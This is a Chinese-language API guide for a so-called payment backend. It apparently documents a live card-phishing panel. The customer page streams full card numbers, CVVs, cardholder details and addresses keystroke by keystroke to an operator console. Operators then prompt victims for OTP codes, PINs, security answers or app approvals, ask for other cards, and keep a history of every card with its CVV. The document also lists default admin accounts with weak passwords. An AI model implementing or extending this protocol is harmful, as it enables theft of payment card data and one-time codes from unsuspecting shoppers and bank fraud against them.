# 支付后台 API 对接说明

## 服务地址

| 服务 | 地址 |
|---|---|
| HTTP API | `http://localhost:9528` |
| WebSocket | `ws://localhost:9528` |

---

## 一、WebSocket 实时通信（客户支付页 ↔ 后台）

### 1.1 建立连接

```
ws://localhost:9528?role=customer&cid={持久化客户ID}&sid={会话ID}
```

| 参数 | 必填 | 说明 |
|---|---|---|
| `role` | 是 | 固定为 `customer` |
| `cid` | 是 | 客户唯一标识，建议 `<random_string>`，存入 localStorage 保持持久化 |
| `sid` | 否 | 已存在的会话 ID，刷新页面重连时附带，用于恢复会话 |

**cid 生成示例：**
```js
let cid = localStorage.getItem('cid');
if (!cid) {
  cid = 'cust_' + Date.now() + '_' + Math.random().toString(36).slice(2,8);
  localStorage.setItem('cid', cid);
}
```

### 1.2 客户 → 后台消息类型

#### `customer_input` — 创建会话并开始实时传输

用户开始输入时立即发送，后续每次输入变化也发送此消息。

```json
{
  "type": "customer_input",
  "payload": {
    "frontendUrl": "shop.example.com",
    "cardInfo": {
      "cardNumber": "4571731234567890",
      "expiry": "06/27",
      "cvv": "123",
      "cardHolder": "JOHN DOE",
      "otpCode": ""
    },
    "customerInfo": {
      "firstName": "John",
      "lastName": "Doe",
      "fullName": "John Doe",
      "email": "john@example.com",
      "phone": "+1234567890",
      "country": "US",
      "address1": "123 Main St",
      "address2": "",
      "city": "New York",
      "state": "NY"
    },
    "browsingTabs": [
      { "label": "商品页", "count": 2, "active": false },
      { "label": "卡片页", "count": 1, "active": true }
    ],
    "currentStep": "card"
  }
}
```

**字段说明：**
| 字段 | 类型 | 说明 |
|---|---|---|
| `frontendUrl` | string | 支付页来源域名 |
| `cardInfo.cardNumber` | string | 完整卡号 |
| `cardInfo.expiry` | string | 有效期 MM/YY |
| `cardInfo.cvv` | string | CVV 安全码 |
| `cardInfo.cardHolder` | string | 持卡人姓名 |
| `cardInfo.otpCode` | string | OTP 验证码，初始为空 |
| `customerInfo.*` | object | 用户详细信息 |
| `browsingTabs` | array | 用户浏览页签，`active: true` 标记当前步骤 |
| `currentStep` | string | 当前步骤：`product`/`address`/`card`/`otp` |

**后台行为：**
- 首次 `customer_input` → 创建新会话，状态 `live`（实时输入中）
- 后续同一客户通过 `sid` 参数重连时恢复已有会话
- 后台自动根据 BIN（卡号前6位）识别卡品牌、卡级、发卡行

**响应：** 后台发送 `operator_action` 消息，`action: "ack"`，包含 `sessionId`

#### `session_update` — 更新已有会话

```json
{
  "type": "session_update",
  "payload": {
    "sessionId": "1166",
    "status": "pending",
    "cardInfo": { "cardNumber": "4571731234567890", "expiry": "06/27", "cvv": "123" },
    "customerInfo": { "fullName": "John Doe" },
    "browsingTabs": [{ "label": "卡片页", "count": 1, "active": true }],
    "currentStep": "card"
  }
}
```

**关键操作：**
- `status: "pending"` → 提交审核，后台弹通知 + 提示音，倒计时 2 分钟开始
- 每次输入变化也应发送 `session_update`（不含 status）保持实时更新
- 换卡号后重新 `status: "pending"` → 旧卡自动计入卡片历史

#### `heartbeat` — 心跳保活

```json
{ "type": "heartbeat" }
```

后台回复 `{ "type": "heartbeat", "payload": "pong" }`。

### 1.3 后台 → 客户消息类型

| type | 触发时机 | payload.action |
|---|---|---|
| `operator_action` | 管理员操作 | 见下表 |
| `session_update` | 会话状态变化 | `status` 字段 |

**`operator_action` 的 action 值：**

| action | 说明 | 用户端行为 |
|---|---|---|
| `ack` | 会话创建成功 | 保存 `sessionId` |
| `session_restored` | 刷新重连恢复 | 回填表单 + 恢复等待状态 |
| `otp_verify` | 要求 OTP 验证 | 显示 OTP 输入框 |
| `custom_otp_verify` | 自定义 OTP 验证 | 弹窗输入手机尾号 |
| `email_verify` | 邮箱验证 | 提示用户查看邮箱 |
| `pin_verify` | PIN 验证 | 要求输入 PIN |
| `cvv_verify` | CVV 验证 | 确认 CVV |
| `app_verify` | APP 验证 | 推送 APP 通知 |
| `question_verify` | 问题验证 | 显示安全问题 |
| `change_card` | 要求换卡 | 提示换卡支付 |
| `custom_prompt` | 自定义提示 | 弹窗 `message` 内容 |
| `redirect_complete` | 跳转完成 | 支付流程结束 |
| `approve` | 支付通过 | 显示成功 |
| `reject` | 支付拒绝 | 显示失败 + `message` |
| `timeout` | 操作超时 | 显示超时 |

**`session_restored` 消息格式：**
```json
{
  "type": "operator_action",
  "payload": {
    "action": "session_restored",
    "sessionId": "1166",
    "status": "pending",
    "cardInfo": { "cardNumber": "457173...", "expiry": "06/27", "cvv": "123", ... },
    "customerInfo": { "fullName": "John", "email": "john@test.com", ... },
    "browsingTabs": [...],
    "currentStep": "card"
  }
}
```

**重要：** `session_restored` 包含完整数据，前端需用这些数据回填表单字段。

---

## 二、HTTP REST API

### 2.1 响应格式

所有 API 返回统一格式：
```json
{
  "code": "0000",
  "msg": "请求成功",
  "data": { ... }
}
```

| code | 说明 |
|---|---|
| `0000` | 成功 |
| `1001` | 参数错误/业务失败 |
| `8888` | 未登录/token失效 |
| `9999` | token过期 |

### 2.2 认证接口

#### POST /auth/login

```json
// 请求
{ "userName": "Super", "password": "123456" }

// 响应
{
  "code": "0000",
  "data": {
    "token": "eyJhbGciOi...",
    "refreshToken": "eyJhbGciOi..."
  }
}
```

#### GET /auth/getUserInfo

Header: `Authorization: Bearer <token>`

```json
// 响应
{
  "code": "0000",
  "data": {
    "userId": "1",
    "userName": "Super",
    "roles": ["R_SUPER"],
    "buttons": ["B_CODE1", "B_CODE2", "B_CODE3"]
  }
}
```

### 2.3 支付会话接口

#### GET /payment/sessions

获取全部支付会话列表。

```json
// 响应
{
  "code": "0000",
  "data": [
    {
      "id": "1166",
      "sessionId": 1166,
      "frontendUrl": "shop.example.com",
      "status": "pending",
      "currentStep": "card",
      "cardInfo": {
        "cardNumber": "457173...",
        "cardType": "VISA",
        "cardLevel": "DEBIT",
        "bankName": "PBS INTERNATIONAL A/S",
        "expiry": "06/27",
        "cvv": "123",
        "cardHolder": "JOHN DOE",
        "otpCode": ""
      },
      "customerInfo": {
        "fullName": "John Doe",
        "email": "john@test.com",
        "phone": "+1234567890",
        "country": "US",
        "address1": "123 Main St",
        "address2": "",
        "city": "New York",
        "state": "NY"
      },
      "browsingTabs": [
        { "label": "商品页", "count": 2, "active": false },
        { "label": "卡片页", "count": 1, "active": true }
      ],
      "cardHistory": [
        {
          "cardNumber": "5213000000000000",
          "cardType": "MASTERCARD",
          "cardLevel": "DEBIT",
          "bankName": "Bank Muscat",
          "expiry": "12/28",
          "cvv": "456",
          "cardHolder": "JOHN DOE"
        }
      ],
      "isOnline": true,
      "countdownSeconds": 87,
      "createdAt": "2026-05-08 12:30:00",
      "updatedAt": "2026-05-08 12:31:00"
    }
  ]
}
```

**status 枚举：**

| 值 | 说明 |
|---|---|
| `live` | 实时输入中 |
| `pending` | 已提交卡号，待处理 |
| `processing` | 处理中 |
| `approved` | 已通过 |
| `rejected` | 已拒绝 |
| `cancelled` | 已取消 |

---

## 三、完整交互流程图

```
┌──────────────────┐           ┌──────────────┐           ┌──────────────┐
│  客户支付页       │           │  后台服务     │           │  管理操作台   │
│  (你的前端)       │           │  :9528        │           │  :9527       │
└────────┬─────────┘           └──────┬───────┘           └──────┬───────┘
         │                            │                          │
         │ 1. WS连接                   │                          │
         │ ws://localhost:9528        │                          │
         │ ?role=customer&cid=xxx     │                          │
         │───────────────────────────>│                          │
         │                            │                          │
         │ 2. customer_input          │                          │
         │ (开始输入卡信息)             │  3. session_new          │
         │───────────────────────────>│─────────────────────────>│
         │                            │  (状态: live)            │
         │   ← ack (sessionId)        │                          │
         │<───────────────────────────│                          │
         │                            │                          │
         │ 4. 持续输入 → session_update│  5. session_update       │
         │───────────────────────────>│─────────────────────────>│
         │                            │  (实时更新卡号/姓名等)     │
         │                            │                          │
         │ 6. 提交审核                  │  7. session_update       │
         │ status: "pending"          │  (状态: pending + 倒计时) │
         │───────────────────────────>│─────────────────────────>│
         │                            │  🔔 提示音 + 通知        │
         │                            │                          │
         │                            │      ← 8. 管理员操作       │
         │                            │     operator_action      │
         │   ← operator_action        │<─────────────────────────│
         │   (otp_verify/approve/     │                          │
         │    reject/change_card...)  │                          │
         │<───────────────────────────│                          │
         │                            │                          │
         │ 9. 用户响应OTP/换卡后        │                          │
         │    重新提交                 │                          │
         │───────────────────────────>│─────────────────────────>│
         │                            │                          │
         │   ← 最终 approve/reject    │                          │
         │<───────────────────────────│                          │
```

---

## 四、关键注意事项

### 4.1 刷新恢复
```
1. 客户刷新页面 → WS 断开重连
2. 连接时附带 sid 参数 → ws://localhost:9528?role=customer&cid=xxx&sid=1166
3. 后台返回 session_restored 消息，包含完整数据
4. 前端用 cardInfo/customerInfo 回填表单
5. 如果 status 为 "pending"，显示等待动画 + 禁用提交按钮
```

### 4.2 实时输入
```
- 每个输入框 oninput 事件触发 150ms 去抖推送
- 首次推送用 customer_input（创建会话）
- 后续推送用 session_update（更新已有会话）
- 必发字段：cardInfo.cardNumber、customerInfo.fullName、browsingTabs、currentStep
```

### 4.3 测试账号

| 用户名 | 密码 | 角色 |
|---|---|---|
| Super | 123456 | 超级管理员 |
| Soybean | 123456 | 管理员 |
| Admin | 123456 | 管理员 |
| User | 123456 | 普通用户 |

### 4.4 开发调试

- 客户测试页：`http://localhost:9527/payment-customer.html`（或 `http://localhost:9528/payment-customer.html`）
- 管理后台：`http://localhost:9527`
- 登录后 → 支付操作台 → 支付会话

### 4.5 服务启动

```bash
cd packages/server
npx tsx src/index.ts     # 启动后端 (HTTP:9528 + WS:9528)

cd ../..
pnpm dev                 # 启动前端 (Vite :9527)
```
